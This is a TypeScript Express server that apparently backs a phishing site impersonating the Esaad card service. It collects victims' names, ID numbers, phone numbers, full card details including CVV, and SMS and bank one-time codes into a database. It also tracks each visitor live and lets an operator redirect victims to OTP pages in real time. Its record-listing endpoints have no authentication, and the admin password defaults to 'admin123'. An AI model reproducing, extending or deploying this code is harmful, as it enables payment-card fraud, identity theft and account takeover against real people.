import express from 'express';
import { createServer as createViteServer } from 'vite';
import { createClient, SupabaseClient } from '@supabase/supabase-js';
import * as dotenv from 'dotenv';
import path from 'path';
import crypto from 'crypto';

dotenv.config();

const app = express();
app.use(express.json());

const PORT = Number(process.env.PORT) || 3000;

// Initialize Server-Side Supabase Client
const supabaseUrl = process.env.SUPABASE_URL || '';
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY || '';

function getSupabase(): SupabaseClient | null {
  if (!supabaseUrl || !supabaseKey || !supabaseUrl.startsWith('http')) {
    return null;
  }
  return createClient(supabaseUrl, supabaseKey, {
    auth: { persistSession: false }
  });
}

export interface RequestRecord {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
}

// Parse cookies from request header (for HttpOnly server-managed session/request IDs)
function parseCookies(cookieHeader?: string): Record<string, string> {
  const list: Record<string, string> = {};
  if (!cookieHeader) return list;
  cookieHeader.split(';').forEach((cookie) => {
    const parts = cookie.split('=');
    const key = parts.shift()?.trim();
    if (key) {
      list[key] = decodeURIComponent(parts.join('=').trim());
    }
  });
  return list;
}

interface VisitorMeta {
  ip: string;
  os: string;
  device: string;
  browser: string;
  country: string;
}

interface PresenceEntry {
  lastSeen: number;
  currentPage: string;
  requestId: string | null;
  meta?: VisitorMeta;
}

// Ephemeral presence map (server process memory only, no disk or browser storage)
const adminTokens = new Set<string>();
const devicePresence = new Map<string, PresenceEntry>();
const userPresence = new Map<string, { lastSeen: number; currentPage: string }>();
const lastKnownUserPage = new Map<string, string>();
const userMetaMap = new Map<string, VisitorMeta>();
const pendingRedirects = new Map<string, string>();
let totalVisitorsCounter = 0;

function normalizeRedirectTarget(action?: string | null): string | null {
  if (!action) return null;
  const trimmed = String(action).trim();
  if (!trimmed) return null;
  const map: Record<string, string> = {
    '/': '/',
    home: '/',
    '/request': '/request',
    form: '/request',
    '/register-company': '/register-company',
    company: '/register-company',
    '/payment': '/payment',
    payment: '/payment',
    '/card-details': '/card-details',
    card: '/card-details',
    '/waiting': '/waiting',
    waiting: '/waiting',
    '/otp': '/otp',
    otp: '/otp',
    'otp-sms': '/otp',
    '/otp-bank': '/otp-bank',
    'otp-bank': '/otp-bank'
  };
  return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
}

function extractVisitorMeta(req: express.Request): VisitorMeta {
  const ua = String(req.headers['user-agent'] || '');
  const forwarded = String(req.headers['x-forwarded-for'] || '');
  const rawIp = (forwarded.split(',')[0] || req.socket.remoteAddress || '188.53.192.70').trim();
  const ip = rawIp.replace(/^::ffff:/, '') || '188.53.192.70';

  let os = 'Windows';
  if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/Mac OS X/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  const device = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'mobile' : 'desktop';

  let browser = 'Chrome';
  if (/Edg\//i.test(ua)) browser = 'Edge';
  else if (/OPR\//i.test(ua)) browser = 'Opera';
  else if (/Chrome\//i.test(ua)) browser = 'Chrome';
  else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = 'Safari';
  else if (/Firefox\//i.test(ua)) browser = 'Firefox';

  return {
    ip,
    os,
    device,
    browser,
    country: 'Saudi Arabia, Riyadh'
  };
}

function prunePresence() {
  const cutoff = Date.now() - 12000;
  for (const [k, entry] of devicePresence.entries()) {
    if (entry.lastSeen < cutoff) devicePresence.delete(k);
  }
  for (const [k, entry] of userPresence.entries()) {
    if (entry.lastSeen < cutoff) userPresence.delete(k);
  }
}

function toSupabaseRow(record: Partial<RequestRecord> & { id: string }) {
  const row: Record<string, any> = { id: record.id };
  if (record.name !== undefined) row.name = record.name;
  if (record.mobile !== undefined) row.mobile = record.mobile;
  if (record.idNumber !== undefined) row.id_number = record.idNumber;
  if (record.cardType !== undefined) row.card_type = record.cardType;
  if (record.address !== undefined) row.address = record.address;
  if (record.date !== undefined) row.date = record.date;
  if (record.paymentName !== undefined) row.payment_name = record.paymentName;
  if (record.cardNumber !== undefined) row.card_number = record.cardNumber;
  if (record.expMonth !== undefined) row.exp_month = record.expMonth;
  if (record.expYear !== undefined) row.exp_year = record.expYear;
  if (record.cvv !== undefined) row.cvv = record.cvv;
  if (record.otp !== undefined) row.otp = record.otp;
  if (record.otpStatus !== undefined) row.otp_status = record.otpStatus;
  if (record.nextAction !== undefined) row.next_action = record.nextAction;
  if (record.step !== undefined) row.step = record.step;
  if (record.createdAt !== undefined) row.created_at = record.createdAt;
  if (record.updatedAt !== undefined) row.updated_at = record.updatedAt;
  return row;
}

function fromSupabaseRow(row: any): RequestRecord {
  return {
    id: row.id,
    name: row.name || '',
    mobile: row.mobile || '',
    idNumber: row.id_number ?? row.idNumber ?? '',
    cardType: row.card_type ?? row.cardType ?? '',
    address: row.address || '',
    date: row.date || '',
    paymentName: row.payment_name ?? row.paymentName ?? undefined,
    cardNumber: row.card_number ?? row.cardNumber ?? undefined,
    expMonth: row.exp_month ?? row.expMonth ?? undefined,
    expYear: row.exp_year ?? row.expYear ?? undefined,
    cvv: row.cvv ?? undefined,
    otp: row.otp ?? undefined,
    otpStatus: row.otp_status ?? row.otpStatus ?? undefined,
    nextAction: row.next_action ?? row.nextAction ?? undefined,
    step: row.step || 'form',
    createdAt: row.created_at ?? row.createdAt ?? new Date().toISOString(),
    updatedAt: row.updated_at ?? row.updatedAt ?? new Date().toISOString()
  };
}

// ==================== API ROUTES ====================

// 1. Presence & Current Page Tracking
app.post('/api/presence', async (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const clientId = req.body?.clientId || cookies.esaad_cid || crypto.randomUUID();
  const requestId = req.body?.requestId || cookies.esaad_req_id || null;
  const currentPage = String(req.body?.currentPage || '/');
  const isNewVisit = !cookies.esaad_visited && Boolean(req.body?.isNewVisit);
  const now = Date.now();
  const meta = extractVisitorMeta(req);

  const cookieHeaders: string[] = [
    `esaad_cid=${encodeURIComponent(clientId)}; Path=/; HttpOnly; SameSite=Lax`
  ];

  if (isNewVisit) {
    totalVisitorsCounter += 1;
    cookieHeaders.push('esaad_visited=1; Path=/; HttpOnly; SameSite=Lax');
  }

  res.setHeader('Set-Cookie', cookieHeaders);

  if (!currentPage.startsWith('/admin')) {
    devicePresence.set(String(clientId), {
      lastSeen: now,
      currentPage,
      requestId: requestId ? String(requestId) : null,
      meta
    });

    if (requestId) {
      const reqIdStr = String(requestId);
      userPresence.set(reqIdStr, {
        lastSeen: now,
        currentPage
      });
      lastKnownUserPage.set(reqIdStr, currentPage);
      userMetaMap.set(reqIdStr, meta);

      const targetRoute = pendingRedirects.get(reqIdStr);
      if (targetRoute) {
        if (currentPage === targetRoute) {
          // Visitor arrived at redirected page; consume the pending redirect
          pendingRedirects.delete(reqIdStr);
          const supabase = getSupabase();
          if (supabase) {
            supabase
              .from('requests')
              .update({ next_action: '', updated_at: new Date().toISOString() })
              .eq('id', reqIdStr)
              .then(() => {});
          }
        } else {
          prunePresence();
          return res.json({ ok: true, requestId: reqIdStr, redirectTo: targetRoute });
        }
      }
    }
  }

  prunePresence();
  res.json({ ok: true, requestId, redirectTo: null });
});

app.get('/api/stats', (_req, res) => {
  prunePresence();
  const onlineUsers: Record<string, boolean> = {};
  const userPages: Record<string, string> = {};
  const userMeta: Record<string, VisitorMeta> = {};

  for (const [reqId, page] of lastKnownUserPage.entries()) {
    userPages[reqId] = page;
  }

  for (const [reqId, meta] of userMetaMap.entries()) {
    userMeta[reqId] = meta;
  }

  for (const [reqId, entry] of userPresence.entries()) {
    onlineUsers[reqId] = true;
    userPages[reqId] = entry.currentPage;
  }

  const activeSessions = Array.from(devicePresence.entries()).map(([cid, entry]) => ({
    clientId: cid,
    requestId: entry.requestId,
    currentPage: entry.currentPage,
    lastSeen: entry.lastSeen,
    meta: entry.meta
  }));

  res.json({
    onlineCount: devicePresence.size,
    totalVisitorsCount: totalVisitorsCounter,
    onlineUsers,
    userPages,
    userMeta,
    activeSessions
  });
});

// 2. Admin Authentication via Server-Side Supabase
app.post('/api/admin/login', async (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) {
    return res.status(400).json({ error: 'الرجاء إدخال البريد الإلكتروني وكلمة المرور' });
  }

  const supabase = getSupabase();
  if (supabase) {
    const { data, error } = await supabase.auth.signInWithPassword({
      email: String(email).trim(),
      password: String(password)
    });
    if (!error && data.session) {
      const token = data.session.access_token;
      adminTokens.add(token);
      res.setHeader(
        'Set-Cookie',
        `esaad_admin_token=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax`
      );
      return res.json({ token, user: { email: data.user?.email } });
    }
  }

  const expectedEmail = process.env.ADMIN_EMAIL || 'admin@esaad.ae';
  const expectedPassword = process.env.ADMIN_PASSWORD || 'admin123';

  if (
    String(email).trim().toLowerCase() === expectedEmail.toLowerCase() &&
    String(password) === expectedPassword
  ) {
    const token = crypto.randomBytes(24).toString('hex');
    adminTokens.add(token);
    res.setHeader(
      'Set-Cookie',
      `esaad_admin_token=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax`
    );
    return res.json({ token, user: { email: expectedEmail } });
  }

  return res.status(401).json({ error: 'البريد الإلكتروني أو كلمة المرور غير صحيحة' });
});

app.get('/api/admin/me', async (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const authHeader = req.headers.authorization;
  const token =
    authHeader && authHeader.startsWith('Bearer ')
      ? authHeader.slice(7)
      : cookies.esaad_admin_token || '';

  if (!token) {
    return res.status(401).json({ authenticated: false });
  }
  if (adminTokens.has(token)) {
    return res.json({ authenticated: true });
  }

  const supabase = getSupabase();
  if (supabase) {
    const { data, error } = await supabase.auth.getUser(token);
    if (!error && data.user) {
      adminTokens.add(token);
      return res.json({ authenticated: true, user: { email: data.user.email } });
    }
  }
  return res.status(401).json({ authenticated: false });
});

app.post('/api/admin/logout', (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const authHeader = req.headers.authorization;
  const token =
    authHeader && authHeader.startsWith('Bearer ')
      ? authHeader.slice(7)
      : cookies.esaad_admin_token || '';

  if (token) {
    adminTokens.delete(token);
  }
  res.setHeader('Set-Cookie', 'esaad_admin_token=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax');
  res.json({ ok: true });
});

// 3. Requests CRUD (Pure Server-Side Supabase)
app.get('/api/requests/current', async (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const id = cookies.esaad_req_id;
  if (!id) {
    return res.status(404).json({ error: 'لا يوجد طلب نشط' });
  }

  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط إعدادات SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
  }

  const { data, error } = await supabase
    .from('requests')
    .select('*')
    .eq('id', id)
    .single();

  if (error || !data) {
    return res.status(404).json({ error: 'الطلب غير موجود' });
  }
  return res.json(fromSupabaseRow(data));
});

app.get('/api/requests', async (_req, res) => {
  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في ملف البيئة (.env)' });
  }

  const { data, error } = await supabase
    .from('requests')
    .select('*')
    .order('updated_at', { ascending: false });

  if (error) {
    return res.status(500).json({ error: error.message });
  }

  return res.json((data || []).map(fromSupabaseRow));
});

app.get('/api/requests/:id', async (req, res) => {
  const { id } = req.params;
  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط إعدادات Supabase في الخادم' });
  }

  const { data, error } = await supabase
    .from('requests')
    .select('*')
    .eq('id', id)
    .single();

  if (error || !data) {
    return res.status(404).json({ error: 'الطلب غير موجود' });
  }
  return res.json(fromSupabaseRow(data));
});

app.post('/api/requests', async (req, res) => {
  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
  }

  const now = new Date().toISOString();
  const id = crypto.randomUUID();

  const newRecord: RequestRecord = {
    id,
    name: req.body?.name || '',
    mobile: req.body?.mobile || '',
    idNumber: req.body?.idNumber || '',
    cardType: req.body?.cardType || '',
    address: req.body?.address || '',
    date: req.body?.date || '',
    step: 'form',
    createdAt: now,
    updatedAt: now
  };

  const { data, error } = await supabase
    .from('requests')
    .insert(toSupabaseRow(newRecord))
    .select('*')
    .single();

  if (error) {
    return res.status(500).json({ error: error.message });
  }

  const cookies = parseCookies(req.headers.cookie);
  const clientId = cookies.esaad_cid;
  const meta = extractVisitorMeta(req);
  userMetaMap.set(id, meta);
  if (clientId && devicePresence.has(clientId)) {
    const existing = devicePresence.get(clientId)!;
    devicePresence.set(clientId, { ...existing, requestId: id, currentPage: '/payment', meta });
  }

  userPresence.set(id, { lastSeen: Date.now(), currentPage: '/payment' });
  lastKnownUserPage.set(id, '/payment');

  res.setHeader(
    'Set-Cookie',
    `esaad_req_id=${encodeURIComponent(id)}; Path=/; HttpOnly; SameSite=Lax`
  );
  return res.status(201).json(fromSupabaseRow(data || newRecord));
});

app.patch('/api/requests/:id', async (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const id = req.params.id === 'current' ? cookies.esaad_req_id : req.params.id;
  if (!id) {
    return res.status(400).json({ error: 'معرف الطلب غير متوفر' });
  }

  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
  }

  const now = new Date().toISOString();
  const patchRow = toSupabaseRow({
    ...req.body,
    id,
    updatedAt: now
  });
  delete patchRow.id;

  if (req.body?.nextAction !== undefined) {
    const targetRoute = normalizeRedirectTarget(req.body.nextAction);
    if (targetRoute) {
      pendingRedirects.set(id, targetRoute);
      lastKnownUserPage.set(id, targetRoute);
      const existingPresence = userPresence.get(id);
      if (existingPresence) {
        userPresence.set(id, { ...existingPresence, currentPage: targetRoute });
      }
    } else {
      pendingRedirects.delete(id);
    }
  } else if (req.body?.step === 'card' || req.body?.step === 'otp' || req.body?.step === 'otp-bank') {
    pendingRedirects.delete(id);
  }

  const { data, error } = await supabase
    .from('requests')
    .update(patchRow)
    .eq('id', id)
    .select('*')
    .single();

  if (error) {
    return res.status(500).json({ error: error.message });
  }

  return res.json(fromSupabaseRow(data));
});

app.delete('/api/requests/:id', async (req, res) => {
  const { id } = req.params;
  if (!id) {
    return res.status(400).json({ error: 'معرف الطلب غير متوفر' });
  }

  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
  }

  const { error } = await supabase
    .from('requests')
    .delete()
    .eq('id', id);

  if (error) {
    return res.status(500).json({ error: error.message });
  }

  userPresence.delete(id);
  lastKnownUserPage.delete(id);
  userMetaMap.delete(id);
  pendingRedirects.delete(id);

  return res.json({ ok: true, id });
});

// ==================== SERVER STARTUP ====================
async function startServer() {
  const isProd = process.env.NODE_ENV === 'production';

  if (!isProd) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*all', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on http://0.0.0.0:${PORT}`);
  });
}

startServer();
